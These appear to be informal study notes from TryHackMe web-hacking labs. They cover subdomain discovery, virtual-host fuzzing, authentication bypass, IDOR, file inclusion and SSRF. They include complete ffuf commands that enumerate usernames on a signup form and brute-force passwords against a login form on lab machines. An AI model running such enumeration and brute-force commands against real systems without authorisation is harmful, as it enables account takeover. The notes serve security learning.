# finding subdomains and pages
created for domain
discover subdomains registerd with https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui
site:www.tryhackme.com  site:*.tryhackme.com can be used to find subdomains
dnsrecon try from list of common subdomains for example api part of website
Sublist3r uses above method and common sites to find subdomains ./sublist3r.py -d acmeitsupport.thm

Virtual hosts
find non public subdomains use ffuf for example hidden admin page ffuf -u https://codingo.io/FUZZ -w ./wordlist.txt replace "FUZZ" with whats in wordlist

# Authentication Bypass
get website url and respone when username already exists
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" 
when usernames thats registred is found try fuff with password

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

# autchenticate Bypass
cookies is encoded or hashed that can be decoded if you know the format


# idor
http://online-service.thm/profile?user_id=1000
when you change for example id 
if its encoded with base64 or other you can guees the format and encod new online. worth to post to crackstation
if you cant detect id. Creat new account and swap encoded if you see others content found idor

# File inclusion
lfi rfi directory traversal
unsantized user input 

# ssrf
when user input is connected to api or database